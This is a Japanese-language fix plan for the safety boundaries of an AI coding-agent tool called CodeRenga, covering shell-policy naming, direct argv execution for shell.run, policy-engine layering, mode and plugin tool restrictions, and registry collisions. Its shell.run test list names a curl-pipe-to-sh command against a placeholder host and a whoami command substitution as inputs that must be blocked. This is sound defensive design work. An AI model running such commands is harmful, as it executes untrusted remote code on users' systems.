# CodeRenga Review Fix Plan 2026-06-26

## 目的

設計書と実装レビューで見つかった差分を、安全境界に近いものから順に小さく修正する。
各修正は、設計書更新、実装、テストを同じ変更単位で進める。

## 優先順位

1. shell / tool policy 設定名の整合
2. shell.run の実行方式を安全設計へ寄せる
3. Policy Engine の入力整理
4. mode 別 tool allow/deny と plugin available_modes の反映
5. Tool Registry の衝突処理
6. session fingerprint の保存と警告
7. compaction trigger の設計反映

## 1. shell / tool policy 設定名の整合

### 問題

設計書では `shell_policy` を使っているが、実装は `tools.json` の `shellPolicy` を読む。
設計書通りに設定したユーザーの block / confirm ルールが反映されない可能性がある。
同様に、設計書では `tool_policy`、実装と初期テンプレートでは `policies` が使われており、設定名の揺れが再発する可能性がある。

### 方針

- `shell_policy` を正規の設定名にする。
- 移行期間だけ `shellPolicy` も読む。
- `tools.json` の `tool_policy` を正規の設定名にする。
- 移行期間だけ `policies` も読む。
- 両方が指定された場合の優先順位と警告を設計書に明記する。
- `--init` が生成する `templates/coderenga.d/tools.json`、README、設定例も同じ正規名へ更新する。

### 実装候補

- `internal/config/config.go` の `tools.json` 読み込み構造体に `shell_policy` を追加する。
- `shell_policy` があればそれを優先し、`shellPolicy` だけの場合は互換読み込みする。
- `tools.json` の `tool_policy` があればそれを優先し、`policies` だけの場合は互換読み込みする。
- 互換読み込みしたことを警告または diagnostics に残す。
- `templates/coderenga.d/tools.json` を正規名で生成する。

### テスト

- `tools.json` の `shell_policy.block` が `shell.run` を block する。
- `shellPolicy` も互換的に読める。
- `tools.json` の `tool_policy` が tool の block / confirm / allow に反映される。
- `policies` も互換的に読める。
- 両方指定時の優先順位が期待通りになる。
- `--init` で生成される `tools.json` が正規名を使う。

## 2. shell.run の実行方式を安全設計へ寄せる

### 問題

設計では `shell.run` は原則として直接 `exec.Command` 相当で実行し、shell 経由にしない。
実装は分類後の元文字列を `/bin/sh -c` または `powershell.exe -Command` に渡している。

### 方針

- 基本入力は `argv` 形式に寄せ、直接 `exec.CommandContext(ctx, argv[0], argv[1:]...)` で実行する。
- `command` 文字列は parser で単一コマンドへ正規化できる場合のみ直接実行する。
- pipe、redirection、command substitution、subshell など shell 機能が必要な場合は `shell_mode: true` を必須にする。
- `shell_mode: true` は必ず confirm 以上にする。
- `shell_mode: true` は危険判定を緩和しない。block rule に該当する command は shell mode でも block のままにする。

### 実装候補

- `shell.run` arguments に `argv` と `shell_mode` を追加する。
- `command` 文字列から得た segment が 1 つだけなら argv 化して直接実行する。
- 複数 segment、redirection、substitution は `shell_mode` なしでは block または confirm-required にする。
- shell mode の有無より前に policy 判定を行い、block を confirm に落とさない。
- Windows PowerShell 固有構文は MVP では狭く扱い、直接実行可能な argv を優先する。

### テスト

- `git status` は shell を経由せず実行される。
- `curl https://example.invalid/x | sh` は block される。
- `shell_mode: true` でも `curl https://example.invalid/x | sh` は block される。
- `echo $(whoami)` は block される。
- redirection は `shell_mode` なしでは実行されない。
- `--non-interactive` で confirm が必要な shell は実行されない。

## 3. Policy Engine の入力整理

### 問題

tool intrinsic policy、`tools.json`、mode、dynamic shell policy、plugin manifest などの判定が分散している。
設計上の集約規則はあるが、どの層がどの理由で判定したかが追いづらい。

### 方針

- 判定層を構造化し、最終判断を `block > confirm > unknown > allow` で集約する。
- 下位層が上位層の厳しい判断を緩和できないことをテストで固定する。
- policy decision の理由を audit / diagnostics に残せる形にする。

### 判定層

- tool intrinsic policy
- `tools.json` の `tool_policy`
- shell policy
- mode write policy
- mode tool allow/deny
- plugin manifest policy
- plugin `available_modes`
- sandbox requirement
- unknown fallback

### テスト

- mode が block の場合、tool policy が allow でも block される。
- tool policy が confirm の場合、manifest が allow でも confirm される。
- shell policy の block が最終判断で block になる。
- non-interactive は confirm / unknown を自動承認しない。

## 4. mode 別 tool allow/deny と plugin available_modes の反映

### 問題

設計では mode ごとの `tools.allow` / `tools.deny` と plugin の `available_modes` を扱う。
実装は主に `write`、`shell`、`mcp` の frontmatter だけを見ている。

### 方針

- mode 定義に tool allow/deny を読み込める構造を追加する。
- plugin manifest の `available_modes` を Policy Engine に参加させる。
- ユーザーに提示する available tools も mode 制限後の一覧にする。

### 実装候補

- MVP では Markdown frontmatter に `tool_allow` / `tool_deny` を追加する。
- `tool_allow` / `tool_deny` は comma-separated list とし、例は `tool_allow: builtin.read_file,builtin.search_text,git.diff` とする。
- config 方式の `tools.allow` / `tools.deny` は後続拡張に回すか、実装する場合は frontmatter と同じ意味に揃える。
- wildcard は MVP では `builtin.*` のような namespace prefix に限定する。
- `available_modes` が空なら全 mode 対象、指定ありなら一致 mode のみ許可する。

### テスト

- reviewer / architect で write tool が block される。
- `tool_allow` / `tool_deny` が frontmatter から読まれる。
- mode の deny に含まれる tool が block される。
- plugin が未許可 mode で block される。
- system prompt の available tools に block 済み tool が出ない。

## 5. Tool Registry の衝突処理

### 問題

設計では同名衝突時に後から来た tool を無効化し、警告する。
実装の `Replace` は無条件に上書きする。

### 方針

- builtin tool は後続 plugin / MCP に上書きされないようにする。
- duplicate は disabled 状態で保持するか、diagnostics に記録する。
- `/tools` や `/tool info` で無効化理由を確認できるようにする。

### 実装候補

- `RegisterDynamic` などの専用 API を作り、duplicate を診断情報として返す。
- `Replace` は reload 専用に限定するか、既存 tool の source が同一の場合だけ許可する。
- source 種別を `builtin` / `plugin` / `mcp` として registry metadata に持たせる。

### テスト

- builtin と plugin が同名の場合、builtin が保持される。
- plugin 同士の同名衝突で後続 plugin が無効化される。
- `/tools` に disabled reason が出る。

## 6. session fingerprint の保存と警告

### 問題

設計では session 再開時に config / prompt fingerprint 差分を警告する。
実装では session 作成時に fingerprint を保存していない。

### 方針

- session 作成時に config と prompt の fingerprint を保存する。
- `/session resume` 時に現在値と保存値を比較する。
- 差分があれば警告し、再開自体は止めない。

### 実装候補

- 読み込んだ config files と prompt files のパス、mtime、hash から fingerprint を作る。
- secret を含む可能性がある値は fingerprint 対象にしても raw 値は保存しない。
- `llm.json` の `apiKey` など secret field は fingerprint 対象から除外するか、値ではなく presence / field name だけを対象にする。
- `sessions.config_fingerprint` と `sessions.prompt_fingerprint` を使用する。

### テスト

- prompt 変更後に resume すると警告が出る。
- config 変更後に resume すると警告が出る。
- fingerprint が同じ場合は警告しない。

## 7. compaction trigger の設計反映

### 問題

設計では `trigger_context_ratio` と level target tokens がある。
実装は未圧縮 message 数を主な条件としている。

### 方針

- まず簡易 token estimate を使い、context 使用率による trigger を実装する。
- level の target tokens は summary 生成指示または compact strategy に反映する。
- message count trigger は補助条件として残す。

### 実装候補

- message 保存時に簡易 `token_estimate` を保存する。
- context builder が現在の推定 token 数を計算する。
- `trigger_context_ratio` を超えたら configured level で compact する。

### テスト

- token estimate が閾値を超えると compact が走る。
- `trigger_turns` だけでも compact が走る。
- compact 後も raw message は削除されない。

## 推奨実施順

### Step 1: 設定名と shell 実行

対象:

- shell / tool policy 設定名の整合
- shell.run の直接実行化

理由:

安全境界そのものなので最優先で直す。

### Step 2: Policy Engine と mode 制限

対象:

- Policy Engine の入力整理
- mode 別 tool allow/deny
- plugin available_modes

理由:

権限判断を一箇所に寄せることで、以降の拡張とレビューがしやすくなる。

### Step 3: Tool Registry の衝突処理

対象:

- duplicate tool の無効化
- registry diagnostics

理由:

plugin / MCP 拡張時の権限誤認を防ぐ。

### Step 4: 運用品質の改善

対象:

- session fingerprint
- compaction trigger

理由:

安全境界の後に、再開時の追跡性と長期利用時の安定性を改善する。

## 完了条件

- 設計書と実装の設定名が一致している。
- `--init` テンプレート、README、設定例も正規設定名を使う。
- `shell.run` が既定で shell 経由実行をしない。
- `shell_mode: true` が block 判定を緩和しない。
- Policy Engine の判定理由をテストで追える。
- mode allow/deny の MVP 表現が決まり、frontmatter から読める。
- mode と plugin の利用可能条件が実行時に enforce される。
- tool 名衝突が無条件上書きにならない。
- session resume 時に config / prompt 差分が警告される。
- compaction が context ratio と turn count の両方で制御される。

